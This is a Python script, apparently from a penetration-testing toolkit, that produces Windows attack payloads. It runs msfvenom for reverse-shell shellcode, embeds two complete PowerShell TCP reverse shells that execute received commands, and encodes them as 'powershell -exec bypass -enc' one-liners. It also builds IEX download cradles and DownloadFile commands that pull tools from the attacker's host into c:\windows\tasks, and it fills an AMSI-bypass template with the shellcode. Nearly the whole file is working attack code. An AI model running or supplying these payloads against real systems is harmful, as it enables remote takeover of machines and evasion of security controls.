#!/usr/bin/python3

# jan-karel changes
# limited to csharp only
# default lport= 443
# writes out csharp project and build it

import os
import sys
import re
import base64
import platform
import argparse
import subprocess
import glob
from random import randint
from meuk.hacksec import *



parser = argparse.ArgumentParser()
parser.add_argument("lhost", help="listener IP to use")
parser.add_argument("lport", help="listener port to use", nargs='?', default="443")
parser.add_argument("payload", help="the payload type from msfvenom to generate shellcode for (default: payload/windows/x64/custom/reverse_winhttps)", nargs='?', default="payload/windows/x64/custom/reverse_winhttps")
parser.add_argument("bestand", help="Warning! Dangerous.... the file to write the output to...", nargs='?', default="http/payloads/shell_443.txt")
args = parser.parse_args()



# Generate the shellcode given the preferred payload
print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Generating payload {bcolors.OKGREEN}{args.payload}{bcolors.OKBLUE} for LHOST={bcolors.OKGREEN}{args.lhost}{bcolors.OKBLUE} and LPORT={bcolors.OKGREEN}{args.lport}{bcolors.ENDC}")
result = subprocess.run(['msfvenom', '-p', args.payload, f"LHOST={args.lhost}", f"LPORT={args.lport}", 'exitfunc=thread', "-f", "powershell"], stdout=subprocess.PIPE)


if result.returncode != 0:
    exit(f"{bcolors.BOLD}{bcolors.FAIL}[x] ERROR: Msfvenom generation unsuccessful. Are you sure msfvenom is installed?{bcolors.ENDC}")







# Get the payload bytes and split them
payload = result.stdout.decode("utf-8")


print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Generating {bcolors.OKGREEN}payload windows/x64/reverse_tcp{bcolors.OKBLUE} for LHOST={bcolors.OKGREEN}{args.lhost}{bcolors.OKBLUE} and LPORT={bcolors.OKGREEN}{args.lport}{bcolors.ENDC}")
result = subprocess.run(['msfvenom', '-p', 'windows/x64/reverse_tcp', f"LHOST={args.lhost}", f"LPORT={args.lport}", 'exitfunc=thread', "-f", "powershell"], stdout=subprocess.PIPE)

payload2 = result.stdout.decode("utf-8")

#hoaxshell varianten

ps1 = '''$c = New-Object System.Net.Sockets.TCPClient('[ip]',[poort]);$s = $c.GetStream();[byte[]]$b = 0..65535|%%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$yolo = (iex $d 2>&1 | Out-String );$yolo = ([text.encoding]::ASCII).GetBytes($yolo + '#');$s.Write($yolo,0,$yolo.Length);$s.Flush()};$c.Close();'''



ps2 = '''$client = New-Object System.Net.Sockets.TCPClient('[ip]',[poort]);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + '#'> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();'''





uit1= ''
uit2= ''


if args.bestand:
    tempiex=lezen('meuk/template/invoke-expression.ps1')
    tempdown=lezen('meuk/template/download_bestand.cmd')


    # Generate the shellcode given the preferred payload
    print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Generating PowerShell payloads for LHOST={bcolors.OKGREEN}{args.lhost}{bcolors.OKBLUE} with LPORT={bcolors.OKGREEN}{args.lport}{bcolors.ENDC}")

    ps1 = ps1.replace('[ip]', args.lhost).replace('[poort]', args.lport)
    ps2 = ps2.replace('[ip]', args.lhost).replace('[poort]', args.lport)


    b1 = ps1.encode('utf-16-le')
    b64a = base64.b64encode(b1)
    b2 = ps2.encode('utf-16-le')
    b64b = base64.b64encode(b2)

    uit1 ="## Powershell reverseshell variant 1\n"
    uit1 = '\n'+uit1+ps1+'\n'
    uit1 = uit1 + '\npowershell -exec bypass -enc '+str(b64a,'utf-8')+'\n'
    uit1 = uit1 + "\n## Powershell reverseshell variant 2\n"
    uit1 = '\n'+uit1+ps2+'\n'
    uit1 = uit1 + '\npowershell -exec -nop -enc '+str(b64b,'utf-8')+'\n\n'

    uit1 = uit1 +'\n# PowerShell scripts\n'


    handig = tempiex.replace('/tools/','/payloads/').replace('[ip]',args.lhost).replace('[bestand]','invoke-shellcode.ps1')
    encoded ="IEX(New-Object Net.WebClient).downloadString('http://[ip]/payloads/[bestand]')".replace('[ip]',args.lhost).replace('[bestand]','invoke-shellcode.ps1').encode('utf-16-le')
    b64 = base64.b64encode(encoded)
    uit1 = uit1 + handig + '\npowershell -Version 2 -exec bypass -enc '+str(b64, 'utf-8')+'\n'

    bestanden = glob.glob('http/tools/*')

    for bestand in bestanden:

        bestand = bestand.split('http/tools/')[1]
        if bestand not in ['PrintSpoofer64.exe', 'SharpHound.exe', 'mimi','index.html']:

            if bestand.endswith('.ps1'):
                encoded ="IEX(New-Object Net.WebClient).downloadString('http://[ip]/tools/[bestand]')".replace('[ip]',args.lhost).replace('[bestand]',bestand).encode('utf-16-le')
                b64 = base64.b64encode(encoded)
                voo = tempiex.replace('[ip]',args.lhost).replace('[bestand]',bestand)
                uit1 = uit1 + voo + '\npowershell -Version 2 -exec bypass -enc '+str(b64, 'utf-8')+'\n'
            else:


                if bestand.endswith('.exe'):

                    if bestand.startswith('f'):
                        bestand = '\\'+bestand

                    voo2 = tempdown.replace('[ip]',args.lhost).replace('[bestand]',bestand) 
                    uit2 = uit2 + voo2
                    naam = bestand.split('.exe')[0]
                    #werkt waarschijnlijk bij alle windows systemen sinds 2013 en later (PowerShell 4)
                    schrijven('http/commands/get_'+naam.lower().replace(' ',''), "powershell -c (new-object System.Net.WebClient).DownloadFile('http://[ip]/tools/[bestand]','c:\\windows\\tasks\\[bestand]')".replace('[ip]',args.lhost).replace('[bestand]',bestand))
                    uit2 =uit2 + "./command.sh [screenname] get_"+naam.lower().replace(' ','')+"\n"


                else:
                    #waarschijnlijk linux
                    noppes = 1

#AMSI bypass

template = lezen('meuk/template/amsi-bypass.ps1')
schrijven('http/payloads/amsi-bypass.ps1', template.replace('[powershell]', payload))
schrijven('http/payloads/amsi-shell.ps1', template.replace('[powershell]', payload2))

tekst = lezen(args.bestand)
schrijven(args.bestand, tekst.replace('[powershellplaceholder]',uit1 + uit2))
